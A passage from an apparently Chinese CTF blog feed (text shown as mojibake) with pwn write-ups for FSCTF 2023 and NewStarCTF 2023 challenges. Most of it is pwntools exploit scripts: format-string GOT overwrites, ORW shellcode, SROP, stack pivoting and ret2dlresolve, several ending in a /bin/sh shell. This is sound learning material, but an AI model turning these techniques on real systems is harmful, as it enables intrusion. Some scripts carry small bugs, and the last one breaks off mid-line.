<ul>
<li>å¼€å§‹æ¥å—æ—¶è¦å…ˆå‘ <code>\n</code>ï¼›</li>
<li>æ¥æ”¶æ•°æ®çš„æ–¹å¼å¾ˆé‡è¦ï¼š<code>recvuntil(b&#39;\nTell&#39;, drop=True)</code>ï¼›</li>
<li>drop&#x3D;True è¡¨ç¤ºå»é™¤æœ«å°¾æ ‡è¯†ã€‚</li>
</ul>
<blockquote>
<p><code>recvuntil()</code>å‡½æ•°ç”¨äºæ¥æ”¶æ•°æ®ï¼Œç›´åˆ°é‡åˆ°æŒ‡å®šçš„å­—ç¬¦ä¸²ï¼Œ<code>drop=True</code>å‚æ•°è¡¨ç¤ºåœ¨è¿”å›ç»“æœæ—¶ï¼Œä¸åŒ…å«è¿™ä¸ªæŒ‡å®šçš„å­—ç¬¦ä¸²</p>
<p>ä¾‹ï¼š</p>
<p><code>p.recvuntil(b&#39;\nTell&#39;, drop=True)</code>ï¼šè¿™è¡Œä»£ç æ¥æ”¶æ¥è‡ªè¿œç¨‹æœåŠ¡å™¨çš„æ•°æ®ï¼Œç›´åˆ°é‡åˆ°å­—ç¬¦ä¸²&quot;\nTell&quot;ä¸ºæ­¢</p>
</blockquote>
<p>è°é»‘æˆ‘å®¶é¸½é¸½æˆ‘è·Ÿè°æ€¥ â˜ºâ˜ºâ˜ºâ˜»â˜»â˜»</p>
<p><img src="/images/FSCTF2023PWN/15.png"></p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class="number">28762</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;brain:\n&#x27;</span>)</span><br><span class="line">key = p.recvuntil(<span class="string">b&#x27;\nTell&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">key = base64.b64decode(key)</span><br><span class="line"></span><br><span class="line">fp = <span class="built_in">open</span>(<span class="string">&#x27;jige&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">fp.write(key)</span><br><span class="line">fp.close()</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&#x27;chmod 777 jige&#x27;</span>)</span><br><span class="line">p_ = process(<span class="string">&#x27;./jige&#x27;</span>)</span><br><span class="line">p_.recvuntil(<span class="string">b&#x27;THE NUMBER IS &#x27;</span>)</span><br><span class="line">num = p_.recvuntil(<span class="string">b&#x27;\nCan&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(num)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="fi3h">Fi3h</span></h2><p>æŸ¥çœ‹ä¿æŠ¤æœºåˆ¶ï¼Œå¼€å¯äº† <code>NX</code> å’Œ <code>PIE</code>ã€‚</p>
<p><img src="/images/FSCTF2023PWN/16.png"></p>
<p>è¿™é¢˜éœ€è¦ä½¿ç”¨ <code>orw</code>ï¼Œä¸è¿‡åŸç†è¿˜æ²¡å®Œå…¨ææ˜ç™½ï¼Œå…ˆè´´å®˜æ–¹ WPï¼Œåç»­ç†è§£åå†è¡¥ã€‚</p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, endian=<span class="string">&#x27;little&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class="number">28785</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;spent in &quot;</span>)</span><br><span class="line"></span><br><span class="line">mmp_addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&quot;.. &quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;mmp_addr:&quot;</span>, <span class="built_in">hex</span>(mmp_addr))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;seems to be &quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&quot; and&quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;leak_addr:&quot;</span>, <span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&quot;5&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;something:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;1.1.1.&quot;</span> + cyclic(<span class="number">0x88</span>) + p64(leak_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;fantasy:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">orw = <span class="string">b&quot;\x90&quot;</span> * <span class="number">0x10</span> + asm(shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>))</span><br><span class="line">orw += asm(shellcraft.read(<span class="number">3</span>, mmp_addr + <span class="number">0x400</span>, <span class="number">0x100</span>))</span><br><span class="line">orw += asm(shellcraft.write(<span class="number">1</span>, mmp_addr + <span class="number">0x400</span>, <span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">p.send(orw)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="ys-start">YS, START!</span></h2><p>è€è§„çŸ©æŸ¥çœ‹ä¸€ä¸‹ä¿æŠ¤æœºåˆ¶ï¼Œ32ä½åªæ‰“å¼€Canaryå’ŒNXï¼Œè¿™é¢˜æˆ‘å½“æ—¶æ²¡æœ‰åšå¥½åƒå°±æ˜¯å› ä¸ºæˆ‘åæ±‡ç¼–ä¸äº†ä¼ªä»£ç ï¼Œçœ‹äº†ä¸‹WPï¼Œç¡®å®æœ‰ç‚¹ç„å­¦</p>
<p><img src="/images/FSCTF2023PWN/17.png"></p>
<p>idaæèµ·æ¥ï¼Œ</p>
<p><img src="/images/FSCTF2023PWN/18.png"></p>
<p>è¿™é¢˜è¿˜æ²¡æœ‰å¼„æ˜ç™½ï¼Œç­‰ä¼šä¼šäº†å†æ¥æ”¹ï¼Œå…ˆè´´ä¸Šå®˜æ–¹WP</p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class="number">28454</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(p32(<span class="number">0x0804C044</span>) + <span class="string">b&quot;%15$hn&quot;</span> + <span class="string">b&quot;%7$d&quot;</span>)</span><br><span class="line">ver = p.recvuntil(<span class="string">b&quot;,P&quot;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:]</span><br><span class="line">p.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;123&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;asd&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;ver&quot;</span>, ver)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h1><span id="æ€»ç»“">æ€»ç»“</span></h1><p>è¿™æ¬¡é«˜æ ¡è”åˆå‡ºé¢˜ï¼Œè´¨é‡æ„Ÿè§‰ä¸é”™ï¼Œå­¦åˆ°äº†å¾ˆå¤šï¼Œä¸€äº›ç›²ç‚¹çš„çŸ¥è¯†ç‚¹ä¹Ÿè€ƒå¯Ÿäº†ã€‚æ€»ä½“æ¥è¯´æŒºæ£’çš„ï¼Œè‡ªå·±è¿˜å¾—åŠ æ²¹ï¼Œå†²å†²å†²ï¼ï¼ï¼</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>FSCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>NewStarCTF 2023 [WEEK 3] PWN</title>
    <url>/NewStarCTF%202023%20%5BWEEK%203%5D%20PWN/</url>
    <content><![CDATA[<p>NewStarCTF 2023 [WEEK 3] PWN</p>
<span id="more"></span>

<h1><span id="ç®€ä»‹">ç®€ä»‹ï¼š</span></h1><p>è¿™å‘¨æ—¶é—´ä¸æ˜¯å¾ˆå……è£•ï¼Œæ²¡æœ‰æ¥å¾—åŠåšï¼Œé¢˜ç›®çœŸçš„é€æ¸å˜éš¾ï¼Œå¾ˆå¤šä¸æ˜¯å¾ˆäº†è§£çš„çŸ¥è¯†ç‚¹é€æ¸æš´éœ²ï¼Œè¿™äº›çŸ¥è¯†ç‚¹ç†è§£èµ·æ¥ä¹ŸæŒºéš¾çš„ï¼Œæ…¢æ…¢æ¥ï¼Œåˆ«æ€¥ï¼ŒåŠ æ²¹ï¼ï¼ï¼</p>
<hr>
<h2><span id="puts-or-system">puts or system?</span></h2><p>æŸ¥çœ‹ä¸€ä¸‹ä¿æŠ¤æœºåˆ¶ï¼Œæ‰“å¼€äº† canary å’Œ NXï¼Œè¿˜æœ‰ä¸€ä¸ªç‚¹å°±æ˜¯ RELROï¼ˆæ³¨æ„ä¸€ä¸‹ï¼Œå› ä¸ºè¿™é¢˜éœ€è¦ä¿®æ”¹ got è¡¨ï¼‰ï¼Œå¼€å¯äº†éƒ¨åˆ†è¯´æ˜ got,plt å¯è¯»å¯å†™ï¼Œä¸æ‡‚çš„å¯ä»¥çœ‹ï¼ˆ<a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(1)/">PWN PWN PWN !!! æŠ€å·§ (1)</a>ï¼‰</p>
<p><img src="/images/NewStarCTF2023%5BWEEK3%5DPWN/1.png"></p>
<p>ida åæ±‡ç¼–ä¸€ä¸‹ï¼Œçœ‹çœ‹ä¼ªä»£ç ï¼Œå‘ç°å‘ç”Ÿäº†æº¢å‡ºå’Œæ ¼å¼å­—ç¬¦ä¸²æ¼æ´ï¼Œè¿˜æœ‰ä¸€ä¸ªé‡è¦çš„ç‚¹å°±æ˜¯ <code>puts(&quot;/bin/sh&quot;)</code>ï¼Œæˆ‘ä»¬è‚¯å®šå¾—æƒ³åŠæ³•å˜æˆ <code>system(&quot;/bin/sh&quot;)</code>ï¼Œè¿™æ ·çš„è¯å°±å¯ä»¥è·å¾— shellï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥ç”¨åˆ° pwntools é‡Œé¢çš„å·¥å…· <code>fmtstr_payload</code> æ¥æŠŠ puts çš„ got åœ°å€ä¿®æ”¹æˆ system çš„åœ°å€ï¼Œé‚£æˆ‘ä»¬å°±å…ˆé€šè¿‡ <code>%s</code> çš„æ–¹æ³•æ¥æ³„éœ² libc ä»è€Œæ¥è·å¾— system çš„åœ°å€ï¼Œè¿™æ ·å°±å¯ä»¥è·å¾— shell äº†ï¼ˆè¿™ç§æ³„éœ² libc çš„æ–¹æ³•å¯ä»¥è®°ä¸€ä¸‹ï¼‰</p>
<p><img src="/images/NewStarCTF2023%5BWEEK3%5DPWN/2.png"></p>
<p><img src="/images/NewStarCTF2023%5BWEEK3%5DPWN/3.png"></p>
<p>exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./111&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26095</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">got_addr = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;(0/1)\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%9$sAAAA&#x27;</span> + p64(got_addr)   <span class="comment"># å¯¹é½</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;There is my gift:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[:<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;(0/1)\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">8</span>, &#123;got_addr: sys_addr&#125;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What\&#x27;s it\n&#x27;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="orw-amp-rop">orw &amp; rop</span></h2><p>æŸ¥çœ‹ä¸€ä¸‹ä¿æŠ¤æœºåˆ¶ï¼Œè·Ÿä¸Šé¢˜ä¸€æ ·çš„ä¿æŠ¤æœºåˆ¶ï¼Œæ ¹æ®é¢˜ç›®å°±çŸ¥é“æ˜¯å¼€å¯äº†æ²™ç›’ï¼Œä¸èƒ½ä½¿ç”¨ execve è°ƒç”¨ï¼Œéœ€è¦è‡ªå·±æ„é€  orw å»è·å¾— flag</p>
<p><img src="/images/NewStarCTF2023%5BWEEK3%5DPWN/4.png"></p>
<p>ida ä¸€ä¸‹ï¼Œå‘ç°æœ‰ä¸ªæ²™ç›’ï¼Œå¹¶ä¸”å¼€è¾Ÿäº†ä¸€å—å¯è¯»å¯å†™çš„åŒºåŸŸ <code>0x66660000</code>ï¼Œè¿˜å‘ç”Ÿæ ¼å¼å­—ç¬¦ä¸²æ¼æ´å’Œæ ˆæº¢å‡ºï¼Œå¯é€šè¿‡æ ¼å¼å­—ç¬¦ä¸²æ¼æ´ï¼ŒæŠŠ canary å’Œ libc æ³„éœ²å‡ºæ¥ï¼Œç„¶åå°±æ˜¯å¥— canary çš„æ¨¡æ¿ï¼ˆå¯è§ <a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(1)/">PWN PWN PWN !!! æŠ€å·§ (1)</a>ï¼‰</p>
<p><img src="/images/NewStarCTF2023%5BWEEK3%5DPWN/5.png"></p>
<p>è¿è¡Œç¨‹åºï¼Œå‘ç°åç§»ä¸º 6ï¼Œå¹¶ä¸” canary ä¸ºç¬¬ 11 ä¸ªå‚æ•°ï¼Œå¯é€šè¿‡ puts å‡½æ•°æ¥æ³„éœ² libcï¼Œç„¶åå°±æ˜¯é€šè¿‡å¯„å­˜å™¨æŠŠå‚æ•°ä¼ è¿›å»ï¼Œæœ€åå°±å¯ä»¥ç›´æ¥æ„é€  orw</p>
<p><img src="/images/NewStarCTF2023%5BWEEK3%5DPWN/6.png"></p>
<p><img src="/images/NewStarCTF2023%5BWEEK3%5DPWN/7.png"></p>
<p>exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pythonå¤åˆ¶ç¼–è¾‘<span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./ezorw&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28531</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">got_addr = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%11$p%8$saaaaaaa&#x27;</span> + p64(got_addr)     <span class="comment"># å¯¹é½</span></span><br><span class="line">p.sendafter(<span class="string">&quot;sandbox\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>),<span class="number">16</span>)     <span class="comment"># canary = int(p.recv()[2:18],16)</span></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">ret      = libc_base + <span class="number">0x2a264</span> </span><br><span class="line">pop_rdi  = libc_base + <span class="number">0x2a3e5</span> </span><br><span class="line">pop_rsi  = libc_base + <span class="number">0x2be51</span> </span><br><span class="line">pop_rdx  = libc_base + <span class="number">0x90529</span>     </span><br><span class="line">pop_rax  = libc_base + <span class="number">0x45eb0</span> </span><br><span class="line">read     = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]     <span class="comment"># elf.plt[&#x27;read&#x27;]</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x28</span> + p64(canary) + p64(<span class="number">0</span>) + p64(ret) \</span><br><span class="line">    + p64(pop_rdi) + p64(<span class="number">0</span>) \</span><br><span class="line">    + p64(pop_rsi) + p64(<span class="number">0x66660000</span>) \</span><br><span class="line">    + p64(pop_rdx) + p64(<span class="number">0x100</span>) + p64(<span class="number">0</span>) + p64(read) \</span><br><span class="line">    + p64(<span class="number">0x66660000</span>)   <span class="comment"># å¥—è·¯ï¼Œä½ åº”è¯¥æ‡‚å§</span></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">orw_shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">orw_shellcode += shellcraft.read(<span class="number">3</span>,<span class="number">0x66660200</span>,<span class="number">0x100</span>)</span><br><span class="line">orw_shellcode += shellcraft.write(<span class="number">1</span>,<span class="number">0x66660200</span>,<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">p.send(asm(orw_shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="srop">srop</span></h2><p>è€è§„çŸ©æŸ¥çœ‹ä¸€ä¸‹ä¿æŠ¤æœºåˆ¶ï¼Œåªæ‰“å¼€äº† NXï¼Œå¹¶ä¸”æ˜¯ full RELROï¼ˆgot.plt å‡ä¸å¯è¯»å¯å†™ï¼‰ï¼Œä¸æ‡‚å¯çœ‹ <a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(1)/">PWN PWN PWN !!! æŠ€å·§ (1)</a>ï¼Œsrop çš„æ–¹æ³•å¯ä»¥å¥—æ¨¡æ¿ï¼Œåˆ©ç”¨ç³»ç»Ÿè°ƒç”¨å·ï¼ˆå¯ä»¥çœ‹çœ‹è¿™é‡Œ <a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(3)/">PWN PWN PWN !!! æŠ€å·§ (3)</a>ï¼‰</p>
<p><img src="/images/NewStarCTF2023%5BWEEK3%5DPWN/8.png"></p>
<p>ida ä¸€ä¸‹ï¼Œå‘ç°å‘ç”Ÿäº†æ ˆæº¢å‡ºï¼Œä½†æº¢å‡ºé•¿åº¦ä¸å¤Ÿæ„é€  ropï¼Œå› æ­¤éœ€è¦æ ˆè¿ç§»ã€‚è¿™ç±»é¢˜ç›®æ ¼å¼æ¨¡æ¿åŒ–ï¼Œå°±æ˜¯è€ƒå¯Ÿä½  srop çš„ç”¨æ³•ï¼Œå¥—æ¨¡æ¿ï¼Œæ³¨æ„ä¸€äº›å‚æ•°å°±è¡Œï¼Œåç»­æˆ‘ä¼šæ›´æ–°è¯¥é¢˜å‹æ¨¡æ¿ï¼Œæ•¬è¯·æœŸå¾…ï¼</p>
<p><img src="/images/NewStarCTF2023%5BWEEK3%5DPWN/9.png"></p>
<p>exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./111&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29475</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">syscall = elf.plt[<span class="string">&#x27;syscall&#x27;</span>]</span><br><span class="line">rdi     = <span class="number">0x401203</span></span><br><span class="line">lea     = <span class="number">0x401171</span>              <span class="comment"># lea     rax, [rbp+var_30]</span></span><br><span class="line">bss     = <span class="number">0x404050</span> + <span class="number">0x500</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;welcome to srop!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rdi = <span class="number">59</span></span><br><span class="line">frame.rsi = bss - <span class="number">0x30</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rcx = <span class="number">0</span></span><br><span class="line">frame.rsp = bss + <span class="number">0x38</span></span><br><span class="line">frame.rip = syscall</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span> + flat(bss, lea)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span> + flat(rdi,<span class="number">15</span>,syscall,frame)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="stack-migration-revenge">stack migration revenge</span></h2><p>æŸ¥çœ‹ä¸€ä¸‹ä¿æŠ¤æœºåˆ¶ï¼Œæ‰“å¼€äº† NX</p>
<p><img src="/images/NewStarCTF2023%5BWEEK3%5DPWN/10.png"></p>
<p>ida åæ±‡ç¼–ï¼Œä½ ä¼šå‘ç°ç›¸è¾ƒä¸Šä¸€å‘¨çš„æ ˆè¿ç§»é¢˜ï¼Œè¿™æ¬¡éœ€è¦è‡ªå·±æ„é€ è¿ç§»åœ°ç‚¹ï¼Œéš¾åº¦ä¸Šå‡ä¸€ä¸ªæ¡£æ¬¡ï¼Œç†è§£è¾ƒéš¾ã€‚æˆ‘ç†è§£æ˜¯åœ¨ read åœ°å€å†™å…¥ ropï¼Œå†æ ˆè¿ç§»åˆ° bss æ®µï¼Œå‰©ä¸‹å¥—è·¯ã€‚æ³¨æ„æ¥æ”¶ï¼Œè¿™çœŸçš„å¾ˆå‘ï¼Œæ‰å‡ æ¬¡ï¼â˜»â˜»â˜»</p>
<p><img src="/images/NewStarCTF2023%5BWEEK3%5DPWN/11.png"></p>
<p>exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./111&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26731</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">got_addr   = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">plt_addr   = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">bss        = elf.bss(<span class="number">0x700</span>)       <span class="comment"># 0x404100</span></span><br><span class="line">rdi_addr   = <span class="number">0x4012b3</span></span><br><span class="line">rbp_addr   = <span class="number">0x40115d</span></span><br><span class="line">leave_ret  = <span class="number">0x401227</span></span><br><span class="line">ret_addr   = <span class="number">0x40101a</span></span><br><span class="line">read       = <span class="number">0x4011FF</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;just chat with me:\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span> + p64(bss +<span class="number">0x50</span>) + p64(read)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;so funny\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(rdi_addr) + p64(got_addr) + p64(plt_addr)</span><br><span class="line">payload += p64(rbp_addr) + p64(bss +<span class="number">0x800</span>) + p64(read)</span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(bss -<span class="number">0x8</span>) + p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;so funny\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr   = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh     = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload = p64(rdi_addr) + p64(bin_sh) + p64(sys_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(bss +<span class="number">0x800</span> -<span class="number">0x58</span>) + p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="dlresolve">dlresolve</span></h2><p>è¿™é¢˜æ˜¯ ret2dlresolve çš„è§£æ³•ï¼Œåœ¨æ¯”èµ›ä¸­è¾ƒå°‘ç¢°åˆ°ï¼Œæˆ‘ç¬¬ä¸€æ¬¡æ¥è§¦ï¼ŒåŸç†è¿˜åœ¨ç†è§£ä¸­ï¼Œå…ˆæŒ‚å®˜æ–¹ WPï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./111&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27108</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">vuln_addr = <span class="number">0x401170</span></span><br><span class="line">plt0 = <span class="number">0x401020</span>  <span class="comment"># plt æ®µåœ°å€</span></span><br><span class="line">bss = <span class="number">0x404040</span></span><br><span class="line">bss_stage = bss + <span 